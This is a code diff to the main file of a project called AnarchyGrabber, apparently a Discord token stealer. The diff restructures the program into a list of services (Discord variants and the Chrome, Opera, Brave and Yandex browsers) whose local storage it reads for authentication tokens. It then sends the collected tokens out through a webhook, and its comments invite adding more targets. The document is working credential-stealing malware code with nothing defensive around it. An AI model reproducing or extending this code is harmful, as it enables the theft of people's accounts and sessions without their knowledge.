+++ AnarchyGrabber/Program.cs
@@ -4,33 +4,29 @@ namespace AnarchyGrabber
 {
     class Program
     {
+        public static List<string> TokenReport = new List<string>();
+
+
+        //different services (feel free to add more)
+        private readonly static List<Service> _services = new List<Service>()
+        {
+            new Service("Discord", @"Roaming\Discord"),
+            new Service("Discord Canary", @"Roaming\discordcanary", true),
+            new Service("Discord PTB", @"Roaming\discordptb"),
+            new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
+            new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
+            new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
+            new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
+        };
+
+
         static void Main(string[] args)
         {
-            List<string> report = new List<string>();
-
-            //attempt to get tokens from the different services (feel free to add more)
-            report.Add("**Discord**");
-            report.AddRange(Grabber.GetTokens(@"Roaming\Discord"));
-            report.Add("\n**Discord Canary**");
-            report.AddRange(Grabber.GetTokens(@"Roaming\discordcanary", true));
-            report.Add("\n**Google Chrome**");
-            report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default"));
-            report.Add("\n**Opera**");
-            report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable", true));
-            report.Add("\n**Brave**");
-            report.AddRange(Grabber.GetTokens(@"Local\BraveSoftware\Brave-Browser\User Data\Default", true));
-            report.Add("\n**Yandex**");
-            report.AddRange(Grabber.GetTokens(@"Local\Yandex\YandexBrowser\User Data\Default", true));
+            foreach (var service in _services)
+                service.GetTokens();
 
             if (Grabber.TokensFound)
-            {
-                //attempts to report the tokens to the user
-                try
-                {
-                    Webhook.ReportTokens(report);
-                }
-                catch { }
-            }
+                Webhook.ReportTokens(TokenReport);
         }
     }
 }